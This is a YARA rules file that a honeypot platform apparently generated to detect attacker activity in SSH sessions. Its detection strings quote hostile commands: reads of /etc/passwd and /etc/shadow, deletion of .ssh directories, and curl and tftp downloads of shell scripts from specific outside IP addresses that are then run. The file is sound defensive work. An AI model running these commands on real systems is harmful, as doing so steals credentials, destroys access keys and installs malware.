// LLM Honeypot Intelligence Platform - YARA Rules
// Generated: 20260326_1537
// Source: Elasticsearch honeypot data (24h window)

rule Honeypot_CredentialTheft {
    meta:
        description = "LLM Honeypot Intelligence - CredentialTheft pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-26"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "8"
        unique_patterns = "7"
    strings:
        $s0 = "cat /etc/passwd 2>/dev/null" ascii nocase
        $s1 = "rm -rf .ssh" ascii nocase
        $s2 = "chattr -ia .ssh" ascii nocase
        $s3 = "mkdir .ssh" ascii nocase
        $s4 = "chmod -R go= ~/.ssh" ascii nocase
        $s5 = "cat /etc/shadow 2>/dev/null" ascii nocase
        $s6 = "lockr -ia .ssh" ascii nocase
    condition:
        any of them
}

rule Honeypot_SystemRecon {
    meta:
        description = "LLM Honeypot Intelligence - SystemRecon pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-26"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "325"
        unique_patterns = "12"
    strings:
        $s0 = "ps -ef" ascii nocase
        $s1 = "lspci" ascii nocase
        $s2 = "ip addr show 2>/dev/null" ascii nocase
        $s3 = "/bin/./uname -s -v -n -r -m" ascii nocase
        $s4 = "uname -s -m" ascii nocase
        $s5 = "ifconfig" ascii nocase
        $s6 = "ip route show 2>/dev/null" ascii nocase
        $s7 = "ps aux" ascii nocase
        $s8 = "hostname" ascii nocase
        $s9 = "uname -m" ascii nocase
        $s10 = "nvidia-smi -q" ascii nocase
        $s11 = "uptime" ascii nocase
    condition:
        any of them
}

rule Honeypot_ToolDownload {
    meta:
        description = "LLM Honeypot Intelligence - ToolDownload pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-26"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "33"
        unique_patterns = "12"
    strings:
        $s0 = "scp -t ~/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s1 = "scp -t /bin/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s2 = "sh tftp2.sh" ascii nocase
        $s3 = "chmod 777 tftp2.sh" ascii nocase
        $s4 = "scp -t /usr/.work/" ascii nocase
        $s5 = "scp -t /dev/shm/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s6 = "scp -t /usr/local/bin/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s7 = "curl -sk https://31.57.216.121/sh" ascii nocase
        $s8 = "scp -t /var/tmp/ltyu2gbpejb4dog81ohvxsrwvs" ascii nocase
        $s9 = "curl -o sshbins.sh http://88.214.20.143/sshbins.sh" ascii nocase
        $s10 = "tftp 88.214.20.143 -c get tftp1.sh" ascii nocase
        $s11 = "sh tftp1.sh" ascii nocase
    condition:
        any of them
}

rule Honeypot_DataCollection {
    meta:
        description = "LLM Honeypot Intelligence - DataCollection pattern detection"
        author = "LLM Honeypot Intelligence Platform"
        date = "2026-03-26"
        source = "honeypot_auto_generated"
        confidence = "high"
        event_count = "4"
        unique_patterns = "1"
    strings:
        $s0 = "locate D877F783D5D3EF8Cs" ascii nocase
    condition:
        any of them
}